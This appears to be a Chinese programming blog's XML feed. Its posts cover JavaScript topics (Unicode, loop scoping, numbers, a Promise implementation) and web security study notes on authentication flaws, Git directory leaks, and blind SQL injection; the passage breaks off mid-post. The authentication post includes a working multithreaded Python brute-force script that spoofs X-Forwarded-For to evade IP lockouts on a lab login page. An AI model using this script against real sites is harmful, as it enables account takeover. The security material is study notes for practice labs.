            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6 的 Unicode</title>
      <link href="2021/12/23/es6-de-unicode/"/>
      <url>2021/12/23/es6-de-unicode/</url>
      
        <content type="html"><![CDATA[<p>在 ES6 之前，JS 字符串是基于 16 位的字符编码进行构建。每 16 位的序列是一个编码单元，代表一个字符。但是现在这 16 位满足不了字符数量的需求了。</p><a id="more"></a><h1 id="UTF-16-码位"><a href="#UTF-16-码位" class="headerlink" title="UTF-16 码位"></a>UTF-16 码位</h1><ul><li>Unicode 目的是给每一个字符提供唯一的数字标识，也称为码位（code point），从 0 开始。</li><li>用来表示字符的数字标识（码位），称为字符编码（character encode）。</li></ul><p>现在字符有两种表示，完全依照 UTF-16 的表示方式：</p><ul><li>16 位的字符，基本多文种平面（BMP），即只有一个编码单元</li><li>32 位的字符，也叫代理对，包含两个编码单元</li></ul><p>ES<code>5</code> 所有的字符串操作基于 16 位的字符（即使此字符使用 32 位表示的）。<br>ES5 代码，IE11 控制台的运行结果：</p><pre><code class="javascript">var e = &#39;😅&#39;;=&gt; undefinede.length=&gt; 2/^.$/.test(e)=&gt; falsee.charAt(0)=&gt; &quot;���&quot;e.charAt(1)=&gt; &quot;���&quot;e.char=&gt; undefinede.charCodeAt(0)=&gt; 55357e.charCodeAt(1)=&gt; 56837</code></pre><p>长度属性是 2，而且第一个和第二个编码单元不是一个 BMP，显示乱码。</p><h1 id="codePointAt-方法"><a href="#codePointAt-方法" class="headerlink" title="codePointAt 方法"></a>codePointAt 方法</h1><p>ES6 新增方法。完全支持 UTF-16。</p><pre><code>var e = &#39;😅a&#39;;=&gt; undefinede.length=&gt; 2e.codePointAt(0)=&gt; 128517e.codePointAt(1)=&gt; 56837e.codePointAt(2)=&gt; 97e.charCodeAt(0)=&gt; 55357e.charCodeAt(1)=&gt; 56837e.charCodeAt(2)=&gt; 97</code></pre><p>到了 ES6，长度属性依然是 2。<br>但是，<code>e.codePointAt(0)</code> 返回的是一个完整的 UTF-16 编码，而非半个 16 位编码，是大于 <code>0xFFFF</code> 的。因此，可以借此判断字符占用的编码单元数量。</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>循环中的作用域</title>
      <link href="2021/12/21/xun-huan-zhong-de-zuo-yong-yu/"/>
      <url>2021/12/21/xun-huan-zhong-de-zuo-yong-yu/</url>
      
        <content type="html"><![CDATA[<p>😕</p><a id="more"></a><h1 id="循环中的函数"><a href="#循环中的函数" class="headerlink" title="循环中的函数"></a>循环中的函数</h1><p>之前，只是知道 let 的块作用域和 var 的函数作用域，今天看了看书，发现自己的理解其实有偏差。<br>记住下面这句话：</p><blockquote><p>let 声明在循环内部的行为是 ES 标准中专门定义的，与 let 的变量提升没有直接关联。</p></blockquote><p>看代码：</p><pre><code class="javascript">var funcs = [];for (var i = 0; i &lt;= 10; i++) {    funcs.push(function () {        console.log(i);    })}funcs.forEach(function (ele) {    ele();})</code></pre><p>结果为，输出打印 10 个 11。<br>因为调用函数时，打印的 <code>i</code> 指向的都是一个 <code>i</code>。<br>不想使用那个变量 <code>i</code>？<br>可以使用 IIFE - 立即执行函数, 强制生成 <code>变量 i</code> 的一个副本。<br>看代码：</p><pre><code class="javascript">for (var i = 0; i &lt;= 10; i++) {    (function (i) {        funcs.push(function () {            console.log(i);        });    })(i)}// 也是 IIFEfor (var i = 0; i &lt;= 10; i++) {    funcs.push(        (function (value) {            return function () {                console.log(value);            }        })(i)    );}</code></pre><p>IIFE 表达式为自己接收的 <code>每一个变量 i</code> 都创建了一个 ** 副本 **。这个副本的值显然就是此时的变量 <code>i</code> 的值。</p><h1 id="循环中的-let-声明："><a href="#循环中的-let-声明：" class="headerlink" title="循环中的 let 声明："></a>循环中的 let 声明：</h1><p>每次循环, let 声明创建一个 <code>新变量 i</code>, 将其初始化 <code>i</code> 的当前值, 所以, 循环内部创建的函数都得到了 i 的副本。</p><pre><code class="javascript">// 输出 0-10for (let i = 0; i &lt;= 10; i++) {    funcs.push(function () {        console.log(i);    })}</code></pre><p><code>in</code> 和 <code>of</code> 循环也是一样的</p><pre><code class="javascript">let funcs = [];let arr = [&#39;a&#39;, &#39;v&#39;, &#39;e&#39;, &#39;d&#39;];// for (var e of arr) {//     funcs.push(function () {//         console.log(e);//     })// } // d d d d// for (let e of arr) {//     funcs.push(function () {//         console.log(e);//     })// }// a v e d// for (var e in arr) {//     funcs.push(function () {//         console.log(e);//     })// } // 3 3 3 3// for (let e in arr) {//     funcs.push(function () {//         console.log(e);//     })// } // 0 1 2 3funcs.forEach((e) =&gt; {    e();})</code></pre><h1 id="循环中的-const-声明"><a href="#循环中的-const-声明" class="headerlink" title="循环中的 const 声明"></a>循环中的 const 声明</h1><p>由于 const 声明的基本类型是不可变的，所以下面的代码报错：</p><pre><code class="javascript">for (const i = 0; i &lt; 9; i++) {    console.log(i);}</code></pre><p>具体是指 <code>i++ 时 TypeError: Assignment to constant variable.</code>。<br>对于 <code>for-in</code> 和 <code>for-of</code>，<code>const</code> 的使用效果与 <code>let</code> 一致, 只是不能在循环内手动修改迭代的值。</p><pre><code class="javascript">let arr2 = [[1, 3], [2, 4]];for (const i of arr2) {    console.log(i);    // i = [0]; // TypeError: Assignment to constant variable.}</code></pre><p>之所以可以这样，原因同前面的 let 一样，在 <code>for-in</code> 和 <code>for-of</code> 时，会创建一个新的 const 绑定。<br>相当于将值进行了复制，每次迭代时都从 <code>arr2</code> 中取出值赋值给迭代变量。</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数值 - JS 悟道</title>
      <link href="2021/10/24/shu-zhi-js-wu-dao/"/>
      <url>2021/10/24/shu-zhi-js-wu-dao/</url>
      
        <content type="html"><![CDATA[<p>1+53+11 === 64</p><a id="more"></a><h1 id="零"><a href="#零" class="headerlink" title="零"></a>零</h1><p>现实里没有 <code>0</code> 和 <code>-0</code>，但是 JS 使用的 IEEE754 标准里有的，JS 里做了一些手脚😎使得直接比较两者是相同的。</p><pre><code>-0 === 0// true</code></pre><p>但是，最好 0 不要用来做除数，也不要使用 <code>Object.is()</code></p><pre><code>(1 / 0) === (1 / -0)// falseObject.is(0, -0);// false</code></pre><h1 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h1><p>JS 内置很多不可变的 number 对象，每个数值字面量实质是对这些不可变 number 对象的引用。字面量值与 number 对象值很接近或者完全吻合。<br>Number 挂载了一些有用的常量。<br><code>Number.EPSILON</code> 保存的是最小的正数。当两数之差小于此数，JS 可以认为两数相等。<br>比如这个经典场景：</p><pre><code>0.1 + 0.2 - 0.3// 5.551115123125783e-170.1 + 0.2 - 0.3 &lt; Number.EPSILON// true</code></pre><p><code>Number.MAX_SAFE_INTEGER</code> 约 9000 万亿，就是 <code>2 ** 53 - 1</code> 打印的结果。<br>同理，<code>Number.MIN_SAFE_INTEGER</code> 是 <code>- (2 ** 53 - 1)</code>。<br>** 在一个期望为整数的运算中，只有所有参与运算的因子，运算结果，中间结果都是在安全整数范围内时，才可以进行精确的整数运算。**<code>Number.isSafeInteger</code> 可以判断是否是安全的整数。</p><p><code>Number.MAX_VALUE</code> 是 JS 的 Number 类型中最大的值，等于 <code>Number.MAX_SAFE_INTEGER * 2 ** 971</code>，其精度损失很大。<br><code>Number.MIN_VALUE</code> 是 JS 中无限逼近 0 的数，值是 <code>2 ** -1074</code>，其精度损失很大。</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><blockquote><p>取余运算 <code>%</code> 取决于被除数，取模运算（JS 不支持）取决于除数。</p></blockquote><h1 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h1><p>JS 做位运算时，有个坑：参与位运算的 number 类型会被转换为 32 位有符号整型（Java 的 int）进行计算，在得到计算结果后，再转换为 JS 的数值类型。虽然 JS 有 54 位安全整数，但是参与位运算时最高的 22 个位会被丢掉，没有任何警告信息。<br>所以，当你想用左移和右移代替乘除时，要注意这个坑。<br>当对负数进行右移时，使用带符号的右移 <code>&gt;&gt;</code> 而不是 <code>&gt;&gt;&gt;</code></p><pre><code>-2 &gt;&gt; 1// -1-2 &gt;&gt;&gt; 1// 2147483647</code></pre><h1 id="解析-Number-的函数"><a href="#解析-Number-的函数" class="headerlink" title="解析 Number 的函数"></a>解析 Number 的函数</h1><pre><code class="javascript">function deconstruct(number) {    // 数值 = 符号位 * 系数 * (2 ** 指数)    let sign = 1;  // 符号位    let coefficient = number;  // 系数    let exponent = 0;  // 2 ** 指数    if (coefficient &lt; 0) {        coefficient = -coefficient;        sign = -1;    }    if (Number.isFinite(number) &amp;&amp; number !== 0) {        exponent = -1128;        let reduction = coefficient;        // 系数不断除 2, 直到趋近于 0 为止, 将除 2 次数与 - 1128 相加, 结果即变量 exp 的值        while (reduction !== 0) {            exponent += 1;            reduction /= 2;        }        reduction = exponent;        // 当指数为 0 时, 可以认为这个值是整数了.        while (reduction &gt; 0) {            coefficient /= 2;            reduction -= 1;        }        while (reduction &lt; 0) {            coefficient *= 2;            reduction += 1;        }        return {            sign, coefficient, exponent, number        }    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>身份验证与授权</title>
      <link href="2021/10/13/shen-fen-yan-zheng-yu-shou-quan/"/>
      <url>2021/10/13/shen-fen-yan-zheng-yu-shou-quan/</url>
      
        <content type="html"><![CDATA[<p>外网教程，翻译过来看着玩玩，哈哈。</p><a id="more"></a><h1 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h1><h1 id="什么是验证-Authentication？"><a href="#什么是验证-Authentication？" class="headerlink" title="什么是验证 Authentication？"></a>什么是验证 Authentication？</h1><p>身份验证是验证给定用户或客户端身份的过程。换句话说，它涉及到确保他们真正是他们。</p><p>有三种身份验证因素可以对不同类型的身份验证进行分类：</p><ul><li>你独有的记忆 or 信息，例如，password 和安全问题（你的小学的名字）。这称为 “knowledge factors”</li><li>你独有的东西，例如，物理的，手机，安全令牌。称为 “possession factors”</li><li>你或者你的行为，例如，生物信息，行为信息。称为 “inherence factors”</li></ul><h1 id="验证和授权区别？"><a href="#验证和授权区别？" class="headerlink" title="验证和授权区别？"></a>验证和授权区别？</h1><p>身份验证是验证用户是否真实是他们声称的身份的过程，而授权则涉及验证用户是否被允许做某事。</p><p>验证：在网站或 Web 应用程序中，身份验证用来确定：尝试使用用户名 Carlos123 访问网站的人是否真的是创建帐户的同一个人。</p><p>授权：一旦 Carlos123 被验证，他的权限将决定他是否被授权访问有关其他用户的个人信息或执行删除其他用户帐户等操作。</p><h1 id="身份验证漏洞是如何产生的？"><a href="#身份验证漏洞是如何产生的？" class="headerlink" title="身份验证漏洞是如何产生的？"></a>身份验证漏洞是如何产生的？</h1><p>从广义上讲，身份验证机制中的大多数漏洞产生于两种方式之一：</p><ul><li>身份验证机制薄弱，因为它们无法充分防止暴力攻击。 </li><li>身份验证过程中的逻辑缺陷或编码不良使身份验证机制完全被攻击者绕过。这有时被称为 “损坏的身份验证 broken authentication”。<br>在 Web 开发中，逻辑缺陷只会导致网站行为出乎意料，这可能引发安全问题，也可能不会。但是，由于身份验证对安全性至关重要，有缺陷的身份验证逻辑会明显增加安全问题的可能性。</li></ul><h1 id="身份验证漏洞的影响？"><a href="#身份验证漏洞的影响？" class="headerlink" title="身份验证漏洞的影响？"></a>身份验证漏洞的影响？</h1><p>身份验证漏洞的影响可能非常严重。一旦攻击者绕过身份验证或强行进入其他用户的帐户，他们就可以访问被攻击的帐户所拥有的所有数据和功能。</p><p>如果他们能够侵入一个享有高度特权的帐户，如系统管理员，他们可以完全控制整个应用程序，并有可能获得对内部基础设施的访问权限。 </p><p>即使泄露低特权帐户，攻击者也可能访问他们本来不应该拥有的数据，例如商业敏感的商业信息。</p><p>即使帐户无法访问任何敏感数据，它也可能允许攻击者访问非直接公开的页面，从而进一步展开攻击。通常，某些高严重性的攻击无法从可公开访问的页面直接进行，但从一些内部页面中可能实现。</p><h1 id="身份验证机制中的漏洞"><a href="#身份验证机制中的漏洞" class="headerlink" title="身份验证机制中的漏洞"></a>身份验证机制中的漏洞</h1><p>网站的身份验证系统通常由几个可能发生漏洞的不同机制组成。某些漏洞在所有这些上下文中广泛适用，而另一些漏洞则更具体于所提供的功能。</p><h2 id="基于密码的登陆的漏洞"><a href="#基于密码的登陆的漏洞" class="headerlink" title="基于密码的登陆的漏洞"></a>基于密码的登陆的漏洞</h2><p>对于采用基于密码的登录过程的网站，用户要么自己注册帐户，要么由管理员分配帐户。此帐户与一个唯一的用户名和一个关联的密码，用户以登录形式输入该密码以验证确实是自己。</p><p>在这种情况下，只有用户自己知道密码的事实被视为用户身份的充分证明。</p><p>因此，如果攻击者能够获取或猜测用户的登录名与密码，网站的安全性将受到损害。</p><p>下面列出一些利用方法：</p><h3 id="暴力攻击"><a href="#暴力攻击" class="headerlink" title="暴力攻击"></a>暴力攻击</h3><p>暴力攻击是攻击者使用系统不断地猜测有效的用户凭据。这些攻击通常使用巨大的用户名和密码的字列字典进行自动化。使用专用工具自动化此过程，使攻击者能够高速进行大量登录尝试。</p><p>暴力攻击并不总是只是对用户名和密码进行完全随机猜测的情况。通过使用基本逻辑或公开的知识，攻击者可以微调攻击，以做出更多有根据的猜测。这大大提高了这种攻击的效率。如果网站不实施足够的暴力攻击防范措施，则基于密码对用户唯一身份验证的网站可能会非常脆弱。</p><p><strong>** 暴力破解用户名 **</strong></p><p>用户名如果符合可识别的模式，那么特别容易猜测，如学校的电子邮件地址 <code>姓名.@学校域名</code>。但是，即使没有明显的模式，有时甚至使用可预测的用户名（如 <code>admin</code> 或 <code>administrator</code>）创建高特权帐户。</p><p>在审查过程中，检查网站是否公开披露潜在用户名。</p><p>例如，能否在不登录的情况下访问用户配置文件？</p><p>即使隐藏了配置文件的实际内容，配置文件本身使用的名称有时也与登录用户名相同。</p><p>还应检查 HTTP 响应，看看是否有任何电子邮件地址被披露。有时，一些网站的响应包含了管理员和 IT 支持等高特权用户的电子邮件地址。</p><p>** 暴力破解密码 **</p><p>许多网站采用某种形式的密码策略，迫使用户创建高熵密码</p><p>然而，虽然高熵密码是很难单独计算机破解，我们可以使用人类行为的基本知识，以利用用户无意的加入的字符。用户通常不会使用随机组合的字符创建强密码，而是使用他们能够记住的密码，以配合密码策略。</p><p>例如，mypassword 不满足网站要求，会使用 <code>Mypasswprd1!</code> 或者 <code>Myp4$$w0rd</code> </p><p>如果该政策要求用户定期更改密码，用户也经常只是对其首选密码进行轻微的可预测更改。<code>Mypasswprd1!</code> 改为 <code>Mypasswprd2!,Mypasswprd1?</code></p><p>** 用户名枚举 **</p><p>用户名列举是攻击者能够观察网站行为的变化，以确定给定用户名是否有效。</p><p>用户名列举通常可以借助录页面，例如，当输入有效的用户名但密码不正确时（提示密码不正确），或在 ** 注册表单中输入已经被占用的用户名时 **。这大大减少了对登录进行暴力所需的时间和精力，因为攻击者能够快速生成有效用户名。</p><p>尝试暴力登陆页面时，下面几个需要留意：</p><ul><li><p>HTTP 状态码。绝大多数猜测的结果可能都是一样的，因为大多数猜测都是错误的。如果一个猜测返回一个不同的状态代码，很有可能表明用户名是正确的。不管结果如何，网站总是返回相同的状态代码是最佳实践，但这种实践并不总是被遵循。</p></li><li><p>错误信息。 有时返回的错误消息是不同的，这取决于用户名和密码是否都不正确，或者只是密码不正确。对于网站来说，最好的做法是在两种情况下使用相同的、通用的信息，但是有时会出现一些小的输入错误</p></li><li><p>响应时间。如果大多数请求都以相似的响应时间处理，那么任何偏离这一时间的请求都表明在幕后发生了不同的事情。这是猜测的用户名可能正确的另一个迹象。例如，一个网站可能只检查密码是否正确如果用户名是有效的。这个额外的步骤可能会稍微增加响应时间。这可能很微妙，但是攻击者可以通过输入一个过长的密码使延迟更加明显，而网站需要更长的时间来处理这个密码。<br>** 暴力破解时，可能会被封锁 IP，在一定时间内禁止登陆行为，此时可以尝试借助 HTTP 的 **<code>X-Forwarded-For:IP 地址</code> 来伪装。</p><p>原文这里给了三个 LAB，就是靶场，可以去试试。<br>用 Python 脚本就几行，这里贴个第三题吧：</p><pre><code class="python">import threadingimport requests</code></pre></li></ul><p>“””使用多线程加上 X-Forwarded-For 伪装 IP 来暴力破解”””</p><p>passwords = “””<br>123456<br>password<br>……<br>“””usernames =”””<br>carlos<br>root<br>……<br>“””passwords = passwords.split(“\n”)[1:-1]<br>usernames = usernames.split(“\n”)[1:-1]</p><p>def force(username, passwords, i):<br>    for idx, password in enumerate(passwords):<br>        # res = {}<br>        # for username in usernames:<br>        url = ‘https:// 靶场的登录 URL’<br>        r = requests.post(<br>            url, {“username”: username, “password”: password}, headers={ “X-Forwarded-For”:f’123.123.{i}.{idx}’ })<br>        if r.text.find(“Invalid username or password”) == -1:<br>            # if int(r.status_code) == 302:<br>            print(f’find: {username} ~ {password}’)<br>            return</p><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    start = 0<br>    while start &lt; len(usernames):<br>        start += 10<br>        if start &gt;= len(usernames):<br>            start = len(usernames)<br>        for i in range(start - 10, start):<br>            t = threading.Thread(target=force, args=(usernames[i], passwords, i))<br>            t.start()<br>            # if (i == start - 1):<br>            #     t.join()</p><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一步步实现 Promise</title>
      <link href="2021/10/10/yi-bu-bu-shi-xian-promise/"/>
      <url>2021/10/10/yi-bu-bu-shi-xian-promise/</url>
      
        <content type="html"><![CDATA[<p>实现了但没完全实现。。。</p><a id="more"></a><p>使用的 ES6 的 class 方式实现的。<br>参考掘金作者 <a href="https://juejin.cn/user/1292681407377624" target="_blank" rel="noopener">Sunshine_Lin</a> 的实现，链接在本文末尾。</p><h1 id="实现构造器"><a href="#实现构造器" class="headerlink" title="实现构造器"></a>实现构造器</h1><p>要点：</p><ol><li>promise 有三个状态，分别是 <code>pending fulfilled rejected</code>，所以实例需要一个保存这个状态的变量。</li><li>promise 需要保存执行后的结果，又需要一个变量保存。</li><li>执行器 exec 里报错时，抛出异常，promise 需要变为 <code>rejected</code> 状态</li></ol><p>实现：</p><pre><code class="javascript">class MyPromise {    constructor(exec) {        this.promiseResult = undefined;        this.promiseState = &#39;pending&#39;;        try {            exec(this.resolve, this.reject);        } catch (e) {            this.reject(e)        }    }}</code></pre><h1 id="实现-resolve-和-reject"><a href="#实现-resolve-和-reject" class="headerlink" title="实现 resolve 和 reject"></a>实现 resolve 和 reject</h1><p>要点：</p><ol><li>promise 由 <code>pending</code> 变为 <code>fulfilled</code> 或者 <code>rejected</code> 后，就 <code>settle</code> 了不会再变了</li><li>要将 resolve 和 reject 的 this 绑定，防止跟随执行环境发生变化</li></ol><p>实现：</p><pre><code class="javascript">class MyPromise {    constructor(exec) {       // ...    }    resolve = (value) =&gt; {        if (this.promiseState === &#39;pending&#39;) {            this.promiseResult = &#39;fulfilled&#39;            this.promiseState = value;        }    }    reject = (reason) =&gt; {        if (this.promiseState === &#39;pending&#39;) {            this.promiseResult = &#39;rejected&#39;;            this.promiseState = reason;        }    }}</code></pre><h1 id="实现同步的-then"><a href="#实现同步的-then" class="headerlink" title="实现同步的 then"></a>实现同步的 then</h1><p>要点：</p><ol><li>因为 then 的两个参数可以省略, 所以需要判断并设置默认值</li><li>根据 promise 的状态执行 then 的不同的函数</li></ol><p>实现：</p><pre><code class="javascript">class MyPromise {    // ...    then = (onFulfilled, onRejected) =&gt; {        // 因为 then 的两个参数可以省略, 所以需要判断        onFulfilled = typeof onFulfilled === &#39;function&#39; ? onFulfilled : val =&gt; val;        onRejected = typeof onRejected === &#39;function&#39; ? onRejected : reason =&gt; { throw reason };        if (this.promiseState === &#39;fulfilled&#39;) {            onFulfilled(this.promiseResult)        }        if (this.promiseState === &#39;rejected&#39;) {            onRejected(this.promiseResult)        }    }}</code></pre><p>同步的 then，无法处理异步任务中的 resolve 和 reject，因为同步执行时 <code>promiseState</code> 还在 <code>pending</code> 状态。不会执行 onFulfilled 或者 onRejected 函数。</p><h1 id="实现异步的-then"><a href="#实现异步的-then" class="headerlink" title="实现异步的 then"></a>实现异步的 then</h1><p>如何保证 then 方法是在 resolve 或这 reject 后才执行?<br>还需要在 then 做功夫，既然同步执行时 <code>promiseState</code> 还在 <code>pending</code> 状态，就再加一个 if 判断，当 promise 状态为 <code>pending</code> 时执行 then，则将当前 then 方法传入的的 <code>onFulfilled</code> 函数和 <code>onRejected</code> 函数放入 promise 实例的所维护的数组中（我发现使用一个变量保存一个函数就可以，想不到为啥用数组，难道有多次 then，而且第二次 then 时，promise 还是 <code>pending</code> 状态？有这种场景？？？）。<br>放入数组的函数，在 resolve 或者 reject 真正执行的时候，才会被执行，此时就拿出数组的 <code>onFulfilled</code> 函数和 <code>onRejected</code> 函数，依次执行。<br>要点：</p><ol><li>添加实例变量，保存在 promise 为 <code>pending</code> 状态时，then 被调用时传入的函数参数</li><li>在 resolve 和 reject 内调用这些方法。</li></ol><p>实现：</p><pre><code class="javascript">class MyPromise {    constructor(exec) {        this.promiseResult = undefined;        this.promiseState = &#39;pending&#39;;        // this.onFulFilledCallback = [];        // this.onRejectedCallback = [];        // 好像不用数组也行...        this.onFulFilledCallback = null;        this.onRejectedCallback = null;        try {            exec(this.resolve, this.reject);        } catch (e) {            this.reject(e)        }    }    resolve = (value) =&gt; {        if (this.promiseState === &#39;pending&#39;) {            this.promiseState = &#39;fulfilled&#39;            this.promiseResult = value;            // console.log(this.onFulFilledCallback.length);            // this.onFulFilledCallback.shift()(value)            if (this.onFulFilledCallback) {                this.onFulFilledCallback(value)            }        }    }    reject = (reason) =&gt; {        if (this.promiseState === &#39;pending&#39;) {            this.promiseState = &#39;rejected&#39;;            this.promiseResult = reason;            if (this.onRejectedCallback) {                this.onRejectedCallback(reason)            }        }    }    then = (onFulfilled, onRejected) =&gt; {        // 因为 then 的两个参数可以省略, 所以需要判断        onFulfilled = typeof onFulfilled === &#39;function&#39; ? onFulfilled : val =&gt; val;        onRejected = typeof onRejected === &#39;function&#39; ? onRejected : reason =&gt; { throw reason };        if (this.promiseState === &#39;fulfilled&#39;) {            onFulfilled(this.promiseResult);        }        if (this.promiseState === &#39;rejected&#39;) {            onRejected(this.promiseResult);        }        if (this.promiseState === &#39;pending&#39;) {            // this.onFulFilledCallback.push(onFulfilled);            // this.onRejectedCallback.push(onRejected);            this.onFulFilledCallback = onFulfilled;            this.onRejectedCallback = onRejected;        }    }}</code></pre><h1 id="实现可链式调用的-then"><a href="#实现可链式调用的-then" class="headerlink" title="实现可链式调用的 then"></a>实现可链式调用的 then</h1><p>要点：</p><ol><li>then 会返回一个新的 promise 实例</li><li>原来的 then 的处理需要 “通知” 到新的 promise 实例</li><li>如果 then 的函数参数的返回值是 promise, 那么新的 promise 实例返回的状态取决于这个 promise</li><li>如果返回值非 promise, 新 promise 对象就是 fulfilled, 且值为此返回值</li></ol><p>实现：</p><pre><code class="javascript">class MyPromise {    constructor(exec) {        this.promiseResult = undefined;        this.promiseState = &#39;pending&#39;;        this.onFulFilledCallback = [];        this.onRejectedCallback = [];        try {            exec(this.resolve, this.reject);        } catch (e) {            this.reject(e)        }    }    resolve = (value) =&gt; {        console.log(&#39;resolve:&#39;, value, &#39;|&#39;, this.onFulFilledCallback);        if (this.promiseState === &#39;pending&#39;) {            this.promiseState = &#39;fulfilled&#39;            this.promiseResult = value;            while (this.onFulFilledCallback.length) {                console.log(&#39;this.onFulFilledCallback.length:&#39;, this.onFulFilledCallback.length);                this.onFulFilledCallback.shift()(this.promiseResult)            }        }    }    reject = (reason) =&gt; {        if (this.promiseState === &#39;pending&#39;) {            this.promiseState = &#39;rejected&#39;;            this.promiseResult = reason;            while (this.onRejectedCallback.length) {                this.onRejectedCallback.shift()(this.promiseResult)            }        }    }    then = (onFulfilled, onRejected) =&gt; {        // 因为 then 的两个参数可以省略, 所以需要判断并设置默认值        onFulfilled = typeof onFulfilled === &#39;function&#39; ? onFulfilled : val =&gt; val;        onRejected = typeof onRejected === &#39;function&#39; ? onRejected : reason =&gt; { throw reason };        // 放到 thenPromise 里了        // if (this.promiseState === &#39;fulfilled&#39;) {        //     onFulfilled(this.promiseResult);        // }        // if (this.promiseState === &#39;rejected&#39;) {        //     onRejected(this.promiseResult);        // }        // if (this.promiseState === &#39;pending&#39;) {        //     this.onFulFilledCallback.push(onFulfilled);        //     this.onRejectedCallback.push(onRejected);        // }        let thenPromise = new MyPromise((res, rej) =&gt; {            // console.log(this.promiseState);            // 此函数是一个箭头函数, exec 也是箭头函数, 所以 resolvePromise 声明时就会绑定到外面的 promise, 而不是这个 promise            const resolvePromise = tt =&gt; {                try {                    // 这个 this 是外面的, 而不是这个新建的 MyPromise 的                    const x = tt(this.promiseResult);  // 执行 tt 函数，拿到函数执行的结果，根据此结果进行判断。                    if (x === this.thenPromise) {  // 这个判断不懂。。。                        throw new Error(&quot;then 返回一个新的 promise 而不是自身&quot;)                    }                    if (x instanceof MyPromise) {                        // console.log(&#39;here&#39;);                        x.then(res, rej);                    } else {                        // 非 promise 时 primise 实例就是调用 resolve 的 fulfilled 的                        res(x);                    }                } catch (err) {                    rej(err)                }            }            if (this.promiseState === &#39;fulfilled&#39;) {                // onFulfilled(this.promiseResult);                resolvePromise(onFulfilled);            }            if (this.promiseState === &#39;rejected&#39;) {                // onRejected(this.promiseResult);                resolvePromise(onRejected);            }            // resolve 或者 reject 是被异步调用的            if (this.promiseState === &#39;pending&#39;) {                this.onFulFilledCallback.push(() =&gt; {                    resolvePromise(onFulfilled)                });                this.onRejectedCallback.push(() =&gt; {                    resolvePromise(onRejected)                });            }        })        return thenPromise;    }}</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://juejin.cn/post/6994594642280857630" target="_blank" rel="noopener">https://juejin.cn/post/6994594642280857630</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 文件泄露</title>
      <link href="2021/09/30/git-wen-jian-xie-lu/"/>
      <url>2021/09/30/git-wen-jian-xie-lu/</url>
      
        <content type="html"><![CDATA[<p>不要忽略. git 目录</p><a id="more"></a><p><code>.git</code> 目录如果在可访问的目录下，会造成源码等文件泄露。<br>因为，git 本身是一个数据库，每次 add 添加文件，就在 <code>.git/objects</code> 目录下保存了数据。<br>如果其他人可以随意访问 <code>.git</code> 目录，那么就可以从中取到并还原所有文件。<br>可以参考这个 <a href="https://git-scm.com/book/zh/v2/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86-Git-%E5%AF%B9%E8%B1%A1" target="_blank" rel="noopener">Git 内部原理</a><br>在实际利用时，<a href="https://github.com/denny0223/scrabble" target="_blank" rel="noopener">这个 git 泄露利用工具</a> 就是使用了 git 命令把服务器上的 git 目录完整地搞下来。</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 注入二</title>
      <link href="2021/09/21/sql-zhu-ru-er/"/>
      <url>2021/09/21/sql-zhu-ru-er/</url>
      
        <content type="html"><![CDATA[<p>续 - 注入实例</p><a id="more"></a><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>需要盲注的场景是，Web 应用不会在响应中返回 SQL 查询的结果，或者 SQL 的，数据库的错误。此时用前面的注入方式是无法看到查询结果的。<br>盲注比较复杂并且比较难执行。</p><p>根据漏洞的性质和所涉及的数据库，以下技术可用盲注：</p><ul><li>您可以更改查询语句的逻辑，从而根据单个条件的真实性来触发应用程序响应中的可以观察出的差异。这可能涉及将新条件注入某些 Boolean 逻辑，或有条件地触发错误，如除以零。</li><li>您可以设定条件去触发查询处理中的时间延迟，允许您根据应用程序响应所需的时间推断出条件的真实性。</li><li>您可以使用 <code>OAST</code> 技术触发带外网络交互(out-of-band)。这种技术非常强大，可以在其他技术不起作用的情况下工作。通常，您可以通过带外网络交互直接渗出数据，例如将数据放入您控制的域名的 DNS lookup。</li></ul><h3 id="触发有条件的响应"><a href="#触发有条件的响应" class="headerlink" title="触发有条件的响应"></a>触发有条件的响应</h3><p>考虑使用 Cookie 收集有关使用情况的分析的应用程序。<br>程序请求包括这样的 cookie：</p><pre><code class="SQL">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4（用户可控制的）</code></pre><p>应用程序可能会根据这个 ID 判断用户：</p><pre><code class="SQL">SELECT TrackingId FROM TrackedUsers WHERE TrackingId = &#39;u5YD3PapBcR4lN3e7Tj4(用户可控制的)&#39;</code></pre><p>虽然这个查询可能有 SQL 注入，但是查询结果用户看不到。<br>例如，应用会根据 ID 存在与否判断用户是否登陆，并返回登陆成功与失败的原因。</p><p>** 总之，会根据你在 <strong><strong>AND</strong></strong> 后追加的条件的真假返回不同的信息即可。<strong>** 这就足够了。</strong></p><p>此响应足以用来盲注，并通过有条件地触发不同的响应来检索信息，具体取决于注射条件。<br>要了解其工作原理，请假设发送了两个请求，依次包含以下 “跟踪”Cookie 值：</p><pre><code 